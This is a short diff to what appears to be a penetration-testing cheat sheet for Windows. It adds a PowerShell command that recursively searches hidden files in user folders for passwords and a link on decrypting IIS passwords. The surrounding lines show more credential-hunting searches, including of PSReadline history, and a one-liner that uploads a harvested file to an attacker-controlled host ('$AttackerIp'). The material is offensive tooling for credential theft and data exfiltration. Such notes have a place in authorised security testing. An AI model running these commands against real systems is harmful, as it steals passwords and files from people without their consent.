@@ -264,11 +264,14 @@ Get-ChildItem -file -recurse -erroraction silentlycontinue -include ('*.txt', '*
 Get-ChildItem -file -recurse -erroraction silentlycontinue -include '*.txt' | get-content | select-string -pattern 'password' -context 5,5
 Get-ChildItem -file -recurse -erroraction silentlycontinue -include '*Readline*' -path c:\users
 Get-ChildItem -file -recurse -erroraction silentlycontinue -include '*.txt' -path c:\users
+Get-ChildItem -file -recurse -erroraction silentlycontinue -path c:\users -hidden | get-content -erroraction silentlycontinue | select-string -pattern 'password'
 ```
 Uploads:
 ```
 powershell (New-Object System.Net.WebClient).UploadFile('http://$AttackerIp/uploadForWindows.php', 'interestingfile.txt')
 ```
+
+IIS decryption: https://www.netspi.com/blog/technical/network-penetration-testing/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/
 
 ### NetExec
 
